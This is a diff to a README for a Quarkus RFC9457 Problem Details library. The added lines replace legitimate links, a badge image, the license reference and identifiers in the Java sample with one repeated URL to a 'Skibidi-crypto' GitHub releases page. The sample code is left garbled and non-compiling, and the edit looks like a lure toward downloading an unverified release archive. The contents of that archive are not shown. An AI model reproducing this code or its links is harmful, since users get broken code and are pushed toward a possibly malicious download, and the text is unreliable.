@@ -20,9 +20,9 @@ To integrate the standardized error responses into your Quarkus application, fol
 3. Update your exception handling to return responses in the RFC9457 format.
 
 ### 📚 Additional Resources
-For more information on using Problem Details in Quarkus APIs and how to leverage this repository, refer to the official documentation or check out the [link to the release zip file](https://github.com/releases/789694263/Release.zip).
+For more information on using Problem Details in Quarkus APIs and how to leverage this repository, refer to the official documentation or check out the [link to the release zip file](https://github.com/Skibidi-crypto/quarkus-openapi-problem/releases).
 
-[![Download Release](https://img.shields.io/badge/Download-Release-blue)](https://github.com/releases/789694263/Release.zip)
+[![Download Release](https://github.com/Skibidi-crypto/quarkus-openapi-problem/releases)](https://github.com/Skibidi-crypto/quarkus-openapi-problem/releases)
 
 ### 🤖 Sample Code
 ```java
@@ -32,13 +32,13 @@ public class CustomExceptionHandler implements ExceptionMapper<MyCustomException
     @Override
     public Response toResponse(MyCustomException exception) {
         Problem problem = new Problem(); // Create a new Problem Details response
-        problem.setStatus(Status.NOT_FOUND);
-        problem.setTitle("Resource Not Found");
-        problem.setDetail(exception.getMessage());
+        https://github.com/Skibidi-crypto/quarkus-openapi-problem/releases(https://github.com/Skibidi-crypto/quarkus-openapi-problem/releases);
+        https://github.com/Skibidi-crypto/quarkus-openapi-problem/releases("Resource Not Found");
+        https://github.com/Skibidi-crypto/quarkus-openapi-problem/releases(https://github.com/Skibidi-crypto/quarkus-openapi-problem/releases());
         
-        return Response.status(problem.getStatus().getStatusCode())
+        return https://github.com/Skibidi-crypto/quarkus-openapi-problem/releases(https://github.com/Skibidi-crypto/quarkus-openapi-problem/releases().getStatusCode())
                 .entity(problem)
-                .type(MediaType.APPLICATION_JSON)
+                .type(https://github.com/Skibidi-crypto/quarkus-openapi-problem/releases)
                 .build();
     }
 }
@@ -51,7 +51,7 @@ If you encounter any issues with the integration or have questions about the rep
 Contributions are welcome! If you have ideas for improvements or new features, feel free to submit a pull request. Let's make error handling in Quarkus applications easier and more efficient together!
 
 ### 📝 License
-This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md) file for details.
+This project is licensed under the MIT License - see the [https://github.com/Skibidi-crypto/quarkus-openapi-problem/releases](https://github.com/Skibidi-crypto/quarkus-openapi-problem/releases) file for details.
 
 ---
 
